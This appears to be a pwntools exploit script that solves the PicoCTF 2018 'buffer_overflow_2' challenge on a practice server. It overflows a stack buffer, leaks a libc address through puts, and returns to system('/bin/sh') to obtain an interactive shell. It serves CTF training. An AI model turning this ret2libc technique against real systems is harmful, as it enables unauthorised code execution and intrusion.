from LibcSearcher import LibcSearcher
from pwn import *

def PicoCTF_2018_buffer_overflow_2(file_name = '/mnt/hgfs/CyberSecurity/PWN/buuoj/PicoCTF_2018_buffer_overflow_2'):
    print('PicoCTF_2018_buffer_overflow_2 start')
    context(log_level='debug', arch='x86', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 28360)
    target_elf = ELF(file_name)

    puts_plt = p32(target_elf.plt['puts'])
    puts_got = p32(target_elf.got['puts'])
    vuln_addr = p32(target_elf.symbols['vuln'])

    pop_ret_gadget = p32(0x0804840d)  # pop ebx ; ret

    payload_1 = b'a' * 112
    payload_1 += puts_plt + pop_ret_gadget + puts_got
    payload_1 += vuln_addr

    target.sendlineafter('Please enter your string: ', payload_1)
    print(target.recv())
    print(target.recvline())
    puts_addr = u32(target.recv(4))
    print(hex(puts_addr))

    searcher = LibcSearcher('puts', puts_addr)
    libc_base_addr = puts_addr - searcher.dump('puts')
    system_addr = p32(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p32(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'a' * 112
    payload_2 += system_addr + pop_ret_gadget + bin_sh_addr

    target.sendline(payload_2)
    target.interactive()

    print('PicoCTF_2018_buffer_overflow_2 end')

if __name__ == '__main__':
    PicoCTF_2018_buffer_overflow_2()